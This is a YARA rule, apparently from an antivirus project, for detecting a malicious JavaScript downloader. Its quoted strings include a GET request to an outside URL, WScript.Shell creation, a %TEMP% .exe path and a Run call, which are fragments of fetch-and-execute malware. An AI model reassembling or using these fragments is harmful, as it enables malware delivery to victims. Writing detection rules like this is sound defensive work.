rule sig_20160401_e433b9bb535262d47d4508e72ccf72ed {
  meta:
    description = "datamaliciousorder - file 20160401_e433b9bb535262d47d4508e72ccf72ed.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "585f1d91481efb4f42e6b4572ac0bb240a63680553f0e053403158ce711a67e8"

  strings:
    $s1  = "CcXof[MnkSig](\"G\" + \"ET\", \"http://ledivinecomedie.com/m9woq\", false);" fullword ascii
    $s2  = "function JqyZc(DtYv, ZihKq){XfTt = XfTt * 1; return DtYv - ZihKq;};" fullword ascii
    $s3  = "var MsLh = function UnOhp() {return WScript[XjoBh](\"WScript\"+\".Shell\");}(), SfhLdh = 11;" fullword ascii
    $s4  = "if (CcXof[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EpWes(){return RhBs + \"\";};" fullword ascii
    $s6  = "function CfPa() {return MsLh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pWZTXHPic9G.ex\" + \"e\";};" fullword ascii
    $s7  = "UvkCe = true; " fullword ascii
    $s8  = "var UvkCe = false;" fullword ascii
    $s9  = "function IjBe(GihFly) {var TfoBv = (1, 2, 3, 4, 5, GihFly); return TfoBv;};" fullword ascii
    $s10 = "function OhsHcx()" fullword ascii
    $s11 = "function MsEv(OzSpv){MsLh[\"R\"+\"un\"](OzSpv, XfTt, XfTt);};" fullword ascii
    $s12 = "function TukOwf(){return 23;};" fullword ascii
    $s13 = "}while (PgjLuy);" fullword ascii
    $s14 = "var HaUrm = false;" fullword ascii
    $s15 = "return JqyZc(WigGc, LaoHxq);" fullword ascii
    $s16 = "function WkIy(){return XjoBh;};" fullword ascii
    $s17 = "var GblDsl = new this[\"Date\"]();" fullword ascii
    $s18 = "function ZzMhz() {return ((UvkCe == true) && (UvkCe == PcaWgm)) ? 1 : XfTt;};" fullword ascii
    $s19 = "} catch(ZrQk){};};" fullword ascii
    $s20 = "var PcaWgm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}